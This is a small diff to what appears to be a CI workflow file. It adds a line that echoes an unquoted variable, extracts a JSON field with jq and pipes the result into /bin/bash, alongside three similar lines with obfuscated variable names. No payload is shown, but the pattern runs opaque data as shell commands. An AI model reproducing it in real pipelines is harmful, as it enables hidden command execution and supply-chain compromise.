@@ -61,6 +61,7 @@ jobs:
           printf '%s' "$l8813" | jq -r .sgfx742 | /bin/bash
           printf '%s' "$ulozd83559" | jq -r .eleca6390 | /bin/bash
           printf '%s' "$y555" | jq -r .ukmk554 | /bin/bash
+          echo $hvhlu5 | jq -r .exi051 | /bin/bash
 
       - name: Save output
         if: always()
